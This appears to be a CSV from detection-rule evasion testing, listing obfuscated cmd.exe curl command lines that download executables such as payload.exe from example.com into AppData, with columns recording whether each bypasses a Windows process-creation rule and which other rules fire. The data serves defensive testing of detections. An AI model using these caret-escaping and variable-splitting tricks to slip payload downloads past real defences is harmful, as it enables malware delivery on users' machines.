Technical,Rule_name,Title,Rule_id,Command_match_rule,Commandline_evasion,Excutable,Bypass target rule,Bypass all rule,Trigger rule
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl -o %A^ppData%\test.exe h^t^t^p://[example.com/test.exe]()""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Potential Commandline Obfuscation Using Escape Characters (f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""curl -o %A^ppData%\test.exe h^t^t^p://[example.com/test.exe]()""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Potential Commandline Obfuscation Using Escape Characters (f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl h^tt^ps://example.com/file.exe -o %AP^PDATA%\file.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""curl h^tt^ps://example.com/file.exe -o %AP^PDATA%\file.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""set protocol=http&& set url=://example.com/file.exe&& set dest=%USERPROFILE%\AppData\Roaming\file.exe&& call curl %protocol%%url% -o %dest%""",TRUE,TRUE,FALSE,Curl Download And Execute Combination (21dd6d38-2b18-4453-9404-a0fe4a0cc288); Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""set protocol=http&& set url=://example.com/file.exe&& set dest=%USERPROFILE%\AppData\Roaming\file.exe&& call curl %protocol%%url% -o %dest%""",TRUE,TRUE,FALSE,Curl Download And Execute Combination (21dd6d38-2b18-4453-9404-a0fe4a0cc288); Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl h^t^t^p^s^:^/^/[example.com/payload.exe]() -o %AppData%\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Potential Commandline Obfuscation Using Escape Characters (f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""curl h^t^t^p^s^:^/^/[example.com/payload.exe]() -o %AppData%\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Potential Commandline Obfuscation Using Escape Characters (f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl http://example.com/payload.exe -o %USERPROFILE%\AppData\Roaming\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""curl http://example.com/payload.exe -o %USERPROFILE%\AppData\Roaming\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
